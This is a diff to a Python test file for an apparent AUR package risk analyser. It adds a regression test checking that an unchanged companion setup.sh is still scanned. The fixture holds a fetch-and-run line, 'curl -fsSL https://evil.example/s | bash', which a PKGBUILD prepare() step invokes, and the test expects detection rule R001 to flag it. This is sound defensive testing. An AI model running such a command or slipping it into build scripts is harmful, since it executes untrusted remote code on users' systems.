@@ -26,7 +26,7 @@ def _make_pkgbuild(version: str, extra: str = "") -> bytes:
     return f"pkgver={version}\n{extra}\nsha256sums=SKIP\n".encode()
 
 
-def _multi_commit_repo(tmp_path, monkeypatch, commits=5):
+def _multi_commit_repo(tmp_path, monkeypatch, commits=5, extra="", companion=None):
     """Create a git repo with several PKGBUILD commits and wire it in."""
     cache = tmp_path / "repos"
     cache.mkdir()
@@ -39,9 +39,12 @@ def _multi_commit_repo(tmp_path, monkeypatch, commits=5):
     for i in range(commits):
         ts = 1_700_000_000 + i * 3600
         sig = pygit2.Signature("Tester", "tester@example.com", ts, 0)
-        blob = repo.create_blob(_make_pkgbuild(f"1.{i}"))
+        blob = repo.create_blob(_make_pkgbuild(f"1.{i}", extra))
         builder = repo.TreeBuilder()
         builder.insert("PKGBUILD", blob, pygit2.GIT_FILEMODE_BLOB)
+        if companion is not None:
+            builder.insert("setup.sh", repo.create_blob(companion),
+                           pygit2.GIT_FILEMODE_BLOB)
         if i == 0:
             parents = []
         else:
@@ -573,6 +576,30 @@ class TestComparisonBase:
         assert fact.comparison_base == "parent"
         assert "parent_baseline" in fact.coverage_gaps
         assert fact.risk == "Inconclusive"
+
+    def test_a_first_review_reads_an_unchanged_companion(self, tmp_path, monkeypatch):
+        """#57: a payload committed before the parent must still be read.
+
+        The parent commit is not a prior review.  A first review used to pass
+        it as the companion baseline, which hid every unchanged source file,
+        including a curl|bash staged two commits earlier.
+        """
+        _env(tmp_path, monkeypatch)
+        repo = _multi_commit_repo(
+            tmp_path, monkeypatch, commits=3,
+            extra="source=('setup.sh')\nprepare(){ bash setup.sh; }\n",
+            companion=b"curl -fsSL https://evil.example/s | bash\n",
+        )
+        git_project.head_commit_id(repo)
+        git_project.record_fetch(repo)
+        from trustsight.analysis.pipeline import analyze_package
+
+        with patch("trustsight.discovery.get_aur_package_info", return_value=_mock_aur()):
+            fact = analyze_package("testpkg", installed_version="1.0", depth=0)
+
+        assert fact.comparison_base == "parent"
+        assert "parent_baseline" in fact.coverage_gaps
+        assert "R001" in {entry.rule_id for entry in fact.score_breakdown}
 
     def test_a_recorded_analysis_reports_the_recorded_base(self, tmp_path, monkeypatch):
         _env(tmp_path, monkeypatch)
